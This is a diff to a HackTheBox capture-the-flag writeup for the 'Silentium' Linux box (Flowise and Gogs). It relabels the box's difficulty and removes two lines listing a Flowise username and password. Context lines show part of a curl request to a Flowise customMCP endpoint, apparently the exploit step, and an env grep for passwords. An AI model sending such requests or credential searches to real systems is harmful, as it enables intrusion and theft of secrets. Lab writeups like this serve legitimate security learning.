@@ -1,6 +1,6 @@
 # Silentium - HackTheBox Writeup
 
-**Linux | Flowise + Gogs | Medium**
+**Linux | Flowise + Gogs | Easy**
 
 ---
 
@@ -38,8 +38,6 @@ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
 
 ```bash
 env | grep -i password
-# FLOWISE_PASSWORD=F!13_d0ck3r
-# FLOWISE_USERNAME=ben
 ```
 
 ```bash
